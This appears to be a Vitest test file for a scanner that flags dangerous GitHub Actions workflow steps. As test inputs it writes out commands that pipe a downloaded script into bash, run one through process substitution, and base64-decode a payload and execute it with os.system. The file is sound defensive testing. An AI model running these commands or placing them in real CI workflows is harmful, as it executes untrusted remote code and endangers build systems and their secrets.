import { describe, expect, it } from 'vitest';
import { scanGithubActionsWorkflowForThreats } from '../../scripts/repo-safety/scanner-core.mjs';

function ruleIds(workflow: string, file = '.github/workflows/build.yml') {
	return scanGithubActionsWorkflowForThreats(file, workflow).map((finding) => finding.ruleId);
}

describe('chaos: GitHub Actions workflow threat guard', () => {
	it.each([
		['curl piped through env bash', 'run: curl -fsSL https://example.invalid/install.sh | env bash', 'github-actions-remote-shell-exec'],
		['process substitution curl into bash', 'run: bash <(curl -fsSL https://example.invalid/install.sh)', 'github-actions-remote-shell-exec'],
		['python base64 decode to shell', 'run: python -c "import base64,os; os.system(base64.b64decode(\'c2g=\'))"', 'github-actions-encoded-shell-exec'],
	])('blocks %s', (_name, workflow, expectedRuleId) => {
		expect(ruleIds(workflow)).toContain(expectedRuleId);
	});

	it('keeps active-workflow scoping tight enough for disabled workflow files', () => {
		expect(ruleIds('on:\n  pull_request_target:', '.github/workflows/build.yml.disabled')).toEqual([]);
	});
});
